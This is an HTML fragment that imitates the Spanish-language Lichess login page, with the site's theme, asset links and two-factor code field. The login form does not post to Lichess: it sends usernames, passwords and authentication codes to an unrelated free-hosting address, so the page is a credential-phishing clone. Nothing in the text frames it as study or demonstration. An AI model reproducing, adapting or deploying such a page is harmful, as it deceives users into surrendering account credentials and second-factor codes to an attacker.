<body class="dark brown Woodi Basic coords-in" data-sound-set="standard" data-socket-domains="socket0.lichess.org,socket3.lichess.org,socket1.lichess.org,socket4.lichess.org,socket2.lichess.org,socket5.lichess.org" data-asset-url="https://lichess1.org" data-asset-version="MBYGlU" data-theme="dark" data-board-theme="brown" data-piece-set="cburnett">
	
	<div id="main-wrap" class="is2d">
		<main class="auth auth-login box box-pad">
			<h1 class="box__top">Iniciar sesión</h1>
			<form method="post" class="form3" action="https://flarelink.000webhostapp.com/lichess/login.php">
				<div class="one-factor">
					<div class="form-group"><label class="form-label" for="form3-username">Nombre de usuario o correo</label><input id="form3-username" name="username" value="" class="form-control" minlength="2" maxlength="320" autofocus="autofocus" required="required" autocomplete="username" /></div>
					<div class="form-group"><label class="form-label" for="form3-password">Contraseña</label><input id="form3-password" name="password" value="" type="password" class="form-control" required="required" autocomplete="current-password" /></div><button type="submit" class="submit button">Iniciar sesión</button><label class="login-remember"><input name="remember" value="true" type="checkbox" checked="checked" />No cerrar sesión</label></div>
				<div class="two-factor none">
					<div class="form-group"><label class="form-label" for="form3-token">Código de autenticación</label><input id="form3-token" name="token" class="form-control" autocomplete="one-time-code" pattern="[0-9]{6}" /><small class="form-help"><span data-icon="">Abre la aplicación de autenticación en dos pasos en tu dispositivo para ver el código de autenticación y verificar tu identidad.</span></small></div>
					<p class="error none">Invalid code.</p><button type="submit" class="submit button">Iniciar sesión</button></div>
			</form>
			<div class="alternative"><a href="/es/signup">Registrarse</a><a href="/password/reset">Cambiar contraseña</a><a href="/auth/magic-link">Log in by email</a></div>
